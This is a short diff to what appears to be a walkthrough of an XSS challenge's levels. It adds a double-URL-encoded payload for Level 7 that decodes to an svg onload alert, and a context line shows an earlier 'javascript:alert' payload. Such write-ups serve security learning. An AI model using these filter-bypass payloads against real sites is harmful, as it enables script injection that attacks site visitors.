@@ -47,6 +47,12 @@ XSS&action=javascript:alert(1337)
 
 ## Level 7
 
+- Double urlencodeing 
+
+```html
+%253Csvg%2520onload%253Dalert%2528%2529%253E
+```
+
 ## Level 8
 
 ## Level 9
